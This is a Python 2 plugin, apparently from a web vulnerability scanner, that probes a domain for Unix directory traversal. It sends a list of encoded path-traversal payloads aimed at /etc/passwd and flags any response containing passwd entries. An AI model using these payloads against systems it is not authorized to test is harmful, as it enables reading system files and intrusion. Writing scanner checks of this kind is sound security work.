#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger

def run_domain(http,ob):
    inj_path_list = [
        "/etc/passwd",
        "/../../../../../../../../../../../../../etc/passwd",
        "//../../../../../../../../../../../../../etc/passwd",
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "//././././././././././././././././././././././././../../../../../../../../etc/passwd",
        "/./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../etc/passwd",
        ".%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"
    ]
    try:
        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        result = []

        for inj_path in inj_path_list:
            new_url = "%s://%s%s" % (scheme,domain,inj_path)
            res, content = http.request(new_url, 'GET', headers=header)
            if res and res.has_key('status') and res['status'] == '200':
                keyword = re.search(r'(\broot:|\bbin:|\bnobody:)',content)
                if keyword:
                    response = getResponse(res, content,'(root:|bin:|nobody:)' )
                    request = getRequest(new_url, domain=ob['domain'])
                    detail = "注入路径："+domain
                    result.append(getRecord(ob,new_url,ob['level'],detail,request,response))
                    return result
    except Exception,e:
        logger.error("File:dir_traversal_unix_domain.py, run_domain function :%s" % (str(e)))
        return []





